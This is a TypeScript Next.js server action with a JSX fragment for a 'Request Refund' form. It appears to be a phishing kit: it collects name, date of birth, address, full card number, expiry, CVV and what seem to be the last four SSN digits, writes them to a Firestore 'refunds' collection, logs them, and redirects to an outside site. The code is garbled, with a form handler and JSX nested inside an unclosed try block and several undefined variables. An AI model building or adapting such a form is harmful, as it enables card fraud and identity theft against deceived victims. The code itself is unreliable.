"use server"

import { db } from './firebase';
import { collection, addDoc } from 'firebase/firestore';

// Define an interface for the form data
export interface FormData {
  orderId: string;
  reason: string;
  firstName: string;
  lastName: string;
  dob: string;
  mobileNumber: string;
  homeAddress: string;
  zipCode: string;
  cardType: string;
  cardNumber: string;
  expirationDate: string;
  cvv: string;
  lfssn: string;
}

// Define the function to handle form submission
export const handleFormSubmit = async (data: FormData): Promise<{ message: string }> => {
  console.log('Submitting data:', data);

  try {
    // Add data to Firestore (Refunds collection)
    const docRef = await addDoc(collection(db, 'refunds'), {
      orderId: data.orderId,
      reason: data.reason,
      firstName: data.firstName,
      lastName: data.lastName,
      dob: data.dob,
      mobileNumber: data.mobileNumber,
      homeAddress: data.homeAddress,
      zipCode: data.zipCode,
      cardType: data.cardType,
      cardNumber: data.cardNumber,
      expirationDate: data.expirationDate,
      cvv: data.cvv,
      lfssn: data.lfssn,
      timestamp: new Date(),
    });

     const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      await handleFormSubmit(formData);
      // ✅ Redirect after success
      router.push('https://nextju.com'); // or use `window.location.href`
    } catch (error) {
      console.error('Failed to submit:', error);
      alert('Failed to submit the form.');
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      {/* Example form fields */}
      <input type="text" name="orderId" onChange={handleChange} required />
      <input type="text" name="firstName" onChange={handleChange} required />
      {/* Add all other inputs here */}
      <button type="submit">Request Refund</button>
    </form>
  );
};
